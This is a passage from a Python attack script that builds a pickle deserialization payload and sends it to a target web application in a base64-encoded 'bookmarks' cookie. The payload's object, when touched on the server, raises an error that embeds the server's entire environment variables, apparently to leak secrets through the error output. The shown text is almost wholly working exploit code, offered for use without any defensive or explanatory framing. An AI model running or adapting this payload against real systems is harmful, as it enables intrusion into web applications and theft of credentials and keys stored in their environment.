        self._data = None
    
    @property
    def url(self):
        import os
        raise RuntimeError(f"PROP_ENV: {dict(os.environ)}")
    
    @property  
    def name(self):
        return "exploit"

class PayloadProperty:
    def __reduce__(self):
        return (list, ([PropertyExploit()],))

try:
    pickled = pickle.dumps(PayloadProperty(), protocol=4)
    encoded = base64.b64encode(pickled).decode()
    print(f"\n[*] Property exploit payload: {encoded}")
    
    response = requests.get(f"{target_url}/list", cookies={"bookmarks": encoded}, headers=headers, timeout=5)
    print(f"[*] Status: {response.status_code}")
except Exception as e:
    print(f"[*] Error: {e}")

